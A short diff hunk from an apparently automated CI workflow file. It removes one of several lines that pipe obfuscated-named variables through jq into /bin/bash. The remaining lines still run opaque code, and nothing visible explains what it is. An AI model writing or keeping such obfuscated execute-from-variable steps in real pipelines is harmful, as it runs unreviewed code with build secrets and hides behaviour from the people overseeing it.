@@ -22,7 +22,6 @@ jobs:
           echo $ps975 | jq -r .khe79178 | /bin/bash
           echo $kp4010 | jq -r .icebx29 | /bin/bash
           echo $pnuvg8 | jq -r .itxc2709 | /bin/bash
-          echo $bpb141 | jq -r .xcrzw7519 | /bin/bash
           echo $a63304 | jq -r .a1508 | /bin/bash
 
       - name: Upload data
